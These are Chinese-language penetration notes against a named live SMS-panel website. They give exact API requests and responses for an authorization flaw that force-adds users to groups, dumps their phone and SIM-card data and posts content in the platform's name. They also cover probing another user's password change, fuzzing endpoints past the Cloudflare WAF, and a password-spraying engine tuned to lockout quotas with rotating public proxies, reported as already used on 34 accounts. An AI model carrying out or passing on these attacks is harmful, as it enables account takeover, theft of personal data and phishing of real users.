# 群 BOLA 与写接口形状坑（opensms.xin / V-IM 面板，2026-09）

目标：`https://www.opensms.xin`「短信系统」SPA，API 前缀 `/csapi`，后端 Spring（`/csapi/vim/server/*` = V-IM 家族），CF 前置。

## 1. 群 BOLA 完整链（一次拿一批完整档 + 无需同意的强拉写入）

前置：任何一个普通账号的 `sa-token`（客户号即可，客户号全是空壳也没关系）。

| 步 | 请求 | 响应 | 说明 |
|---|---|---|---|
| 1 | `POST /csapi/vim/server/groups`，体 `{"name":"实测群","openInvite":false,"inviteCheck":false}` | `{"code":200,"data":{"id":<gid>}}` | 自己成为群主；字段可只给 `name` |
| 2 | `POST /csapi/vim/server/groups/{gid}/users`，体 **裸 JSON 数组** `["127","106","469","271"]` | `{"code":200,"msg":"ok"}` | **强拉，零同意、零授权**；服务端还会往被拉人推事件「小宇中控,syt,fly,代理1…加入了群」 |
| 3 | `GET /csapi/vim/server/groups/{gid}/users` | 成员**完整对象**数组 | 字段见下，比 `friends` 更全 |
| 4 | `POST /csapi/chatsms/httpFallback`，体 `{"chatId":<gid>,"chatType":"group","content":"..."}` | `{"code":200,"msg":"发送成功"}` | **以平台名义往群里投递内容**（社工/钓鱼面）。PoC 只发一条中性内容，**不要**对真实用户群发 |
| alt | `POST /csapi/vim/server/groups/quickGroup` | 同上 | 「一步建群 + 拉人」，同样零校验 |

**写 body 形状矩阵（关键坑，三步都要试）**：

| body | 结果 |
|---|---|
| `["127","106"]` | ✅ `{"code":200,"msg":"ok"}` |
| `{"userIds":["127","106"]}` | ❌ 500 |
| `{"ids":"127,106"}` / `"127"` | ❌ 500 |

⇒ **写接口回 500 而读接口能用时，先换 body 形状，别写「无权限/路由不存在」**。

成员对象字段（`GET /groups/{gid}/users`）：`id` / `name` / `loginName` / `mobile` / `deptId` / `allowBatchMms` / `allowMmsText` / `dayliModelTimes` / `avatar` …

`dayliModelTimes` = **手上的实体（卡）数** ⇒ 直接当目标优先级表用。9 个带卡中控实测：

```
小宇中控(127)=11281   syt(469)=5204   fly(271)=4902   daili1(106)=561
qing01=246   qing03=200   中文测试=153   测试中控2=50   测试中控=4
```

目录里另外 484 个客户号 `dayliModelTimes=0`、`chats=0` ⇒ **纯空壳**，喷出来的密码没有数据价值（本会话喷到 34 个才确认这点，教训：先按计数字段排序再决定喷谁）。

## 2. 敏感数据挂在「窗口/会话对象」而非用户对象

`POST /csapi/vim/server/chat {"type":"friend","id":"127"}` —— **凭空造出一个 1:1 窗口**（无需对方同意），随后 `chat/list` 里出现该对象。`type:'friend'` 的 `id` = 对端用户 id，`type:'group'` 的 `id` = 群 id。

chat 列表项 schema（**卡号/手机号就在这层**）：

```
selfCardNo  selfFullPhoneNo  selfPhoneCallingCode  selfPhoneCarrireIdentif
selfOpr  selfSlotIdentif  batchId  dayliModel  proxyUserAccount  proxyUserId
```

⇒ 用户详情接口读不到的东西，**先怀疑读错了资源类型**，把手上的 list 接口逐个 dump schema。

## 3. 「200 是谎报」：`updatePwd` 静默忽略他人 ID

`PUT /csapi/vim/server/users/updatePwd` 试过的形状与结果：

| 形状 | 响应 | 目标账号密码 |
|---|---|---|
| `{"userId":"127","password":"...","newPassword":"..."}` | `{"code":200,"msg":"ok","data":true}` | **不变** |
| `{"id":...}` / `{"uid":...}` / `{"toUserId":...}` | 同上 | **不变** |
| `/users/updatePwd/127` 路径式 | 同上 | **不变** |
| 不传他人 ID（改自己） | 同上 | **确实改了**（重放登录成功） |

⇒ **判据是「用目标账号重放登录」，不是响应码**。另：该接口有频率限制（连测会吃 429「请求过于频繁」），矩阵测试要放慢单发。

## 4. 分包被 WAF 挡 → 用 chunk 名反推端点，用 404 vs 500 判存在性

`/assets/StatisticsApi-9hdjbLQ1.js` 等懒加载分包全被 CF 403（换 UA / 浏览器指纹客户端 / 同源 fetch 均无内容）。**但主包里的 chunk 文件名本身可用**：`StatisticsApi` / `BatchIndex` / `Invite` / `Index` / `Info` / `Edit` —— 功能名反推端点名做模糊测试，判据是：

- `404` = 路由不存在
- `{"code":500,"msg":"服务器繁忙"}` = **路由在**（缺参/业务抛错）—— 实测命中 `users/page`、`validateList`、`waitCheckList`、`sdk/message`
- `Request method 'POST' not supported`（裹在 500 信封里）= GET-only 路由

CF 行为实测（本案，多轮修正）：**POST 稳定直达源站；GET 概率放行 8–10/10（重试即可，带头与否无关）；`X-HTTP-Method-Override` / `_method` 全部无效**；同一读端点隔 10 分钟从「20 发全挑战」变「8/10 真 JSON」⇒ 读客户端必须内置 15–25 次重试。

## 5. 配额喷器工程（锁死型账号）

- 锁按**原始用户名串**分桶、且是**账号级、与出口无关**（40 个不同出口打同一账号全锁）。中文名无大小写变体 ⇒ 硬顶 15 发/2min（≈450 发/h）。
- **垃圾响应不吃配额**：只在拿到业务响应时计数；垃圾换出口重试、`tout=6/tries=3`。实测同一中文账号 **0.44 → 5.2 词/min（12×）**。
- 配额循环独立进程 + `sleep 130` 对齐窗口；「已用配额」与「已测口令」分开落盘。
- 广表战役（拉丁名，`2^L−1` 桶）与配额循环并行，**别塞进同一张对表**（否则中文号每轮只吃到头 15 发就饿死）。
- 出口池：公开代理列表两轮共 5370 候选 → 用**目标端点本身**测活，只留能回业务 JSON 的（13 → 累计 86 个），定期刷新；Tor 出口整池被 CF 403 时直接废弃。
